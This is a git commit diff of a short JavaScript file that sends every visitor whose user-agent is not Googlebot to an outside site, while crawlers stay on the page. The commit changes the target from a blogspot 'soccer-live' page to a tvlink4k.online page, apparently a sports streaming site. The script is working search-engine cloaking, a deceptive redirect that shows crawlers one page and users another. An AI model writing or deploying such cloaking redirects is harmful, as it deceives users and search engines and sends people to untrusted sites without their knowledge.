630c75c840cd61952ecaf129b52ec24138bc95eb
rabb69087-rgb <rabb69087@gmail.com>
2026-09-23 22:10:38 +0600

    Update redirect URL for normal users

--- tyk.js
+++ tyk.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://faatv247.blogspot.com/2026/09/soccer-live.html";
+  window.location.href = "https://tvlink4k.online/Trofeo-Matteotti";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
